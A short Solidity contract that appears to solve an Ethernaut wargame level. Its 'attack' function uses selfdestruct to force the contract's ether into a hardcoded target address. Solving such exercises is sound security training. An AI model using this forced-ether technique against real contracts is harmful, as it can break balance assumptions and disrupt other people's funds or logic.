// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.0;

contract ToBeDeleted {

    function attack() payable public {
        address payable ethernaut = payable(0x1F7D594Af42a763F9d3eCfD85c7f6F9dF66012c2);
        selfdestruct(ethernaut);
    }
}